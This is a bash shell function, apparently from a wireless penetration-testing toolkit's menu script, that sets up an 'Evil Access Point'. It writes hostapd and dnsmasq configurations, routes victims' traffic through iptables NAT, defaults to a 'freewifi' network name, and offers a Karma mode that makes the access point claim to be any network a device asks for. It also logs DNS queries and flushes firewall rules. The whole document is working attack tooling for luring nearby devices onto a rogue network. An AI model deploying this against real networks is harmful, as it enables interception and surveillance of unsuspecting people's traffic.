f_evilap(){

	f_evilap_check(){
	# Check for dnsmasq.conf and if not there create a default one
	if [ ! -e "/etc/dnsmasq.conf" ]; then
		echo "Default dnsmasq.conf was not found. Creating new one."
		sleep 5
		cat <<EOF > /etc/dnsmasq.conf
		log-facility=/var/log/dnsmasq.log
		#address=/#/10.0.0.1
		#address=/google.com/10.0.0.1
		interface=wlan1
		dhcp-range=10.0.0.10,10.0.0.250,12h
		dhcp-option=3,10.0.0.1
		dhcp-option=6,10.0.0.1
		#no-resolv
		log-queries
EOF
	fi
	}
	f_evilap_menu(){
	clear
	echo "				EVIL ACCESS POINT"
	echo ""
	echo "	Using hostapd requires external wireless (wlan1)"
	echo ""
	echo "[1] Start EvilAP"
	echo "[2] Stop EvilAP and flush iptables"
	echo ""
	echo "[0]	Exit to Wireless Menu"

	read -p "Choice:" sniffchoice

	case $sniffchoice in

	1) clear; f_evilap_start_ap ;;
	2) clear; service hostapd stop; service dnsmasq stop;iptables --flush;iptables --table nat --flush;iptables --delete-chain;iptables --table nat --delete-chain;echo "Stoped Services/Flushed iptables"; sleep 5 ;;
	0) clear; f_wireless_attacks ;;
	*) echo "Incorrect choice..." ;
	esac
	}

f_evilap_int_internet(){
	clear
    echo "Select which interface you are using for Internet?:"
    echo
    echo "1) rmnet0 (3G GSM connection)"
    echo "2) eth0  (USB ethernet adapter - depends on kernel y-cable support)"
    echo "3) wlan0  (Internal Wifi)"
    echo

    read -p "Choice: " interfacechoice

case $interfacechoice in
    1) INT_EVIL_INTERNET=rmnet0; f_evilap_menu ;;
    2) INT_EVIL_INTERNET=eth0; f_evilap_menu ;;
    3) INT_EVIL_INTERNET=wlan0; f_evilap_menu ;;
    *) INT_EVIL_INTERNET=rmnet0 ;;
esac
}

f_evilap_start_ap(){
	#EVIL_LOGNAME="/captures/evilap/evilap-$(date +%s).log"
	clear
	f_evilap_int_internet
	read -p "Enter an SSID name for Access Point: " EVIL_SSID
	if [ -z $EVIL_SSID ]; then
		EVIL_SSID=freewifi
	fi
	echo "Starting EvilAP"
	iptables -t nat -F
	iptables -F
	iptables -t nat -A POSTROUTING -o $INT_EVIL_INTERNET -j MASQUERADE
	iptables -A FORWARD -i wlan1 -o $INT_EVIL_INTERNET -j ACCEPT
	read -p "Enable Karma (access point will claim to be everything)? (y/n)" karma
	if [ "$karma" == "y" ]; then
	rm /etc/hostapd/hostapd.conf
	cat <<EOF > /etc/hostapd/hostapd.conf
	interface=wlan1
	driver=nl80211
	ssid=$EVIL_SSID
	channel=1
	# Yes, we support the Karma attack.
	enable_karma=1
	#logger_syslog=-1
	#logger_syslog_level=1
EOF
	else
	rm /etc/hostapd/hostapd.conf
	cat <<EOF > /etc/hostapd/hostapd.conf
	interface=wlan1
	driver=nl80211
	ssid=$EVIL_SSID
	channel=1
	# Yes, we support the Karma attack.
	#enable_karma=1
	#logger_syslog=-1
	#logger_syslog_level=1
EOF
	fi
	service dnsmasq start
	hostapd -d -p /opt/hostapd.pid /etc/hostapd/hostapd.conf
}

# This is where EvilAP launches the menu
f_evilap_check
f_evilap_menu
}

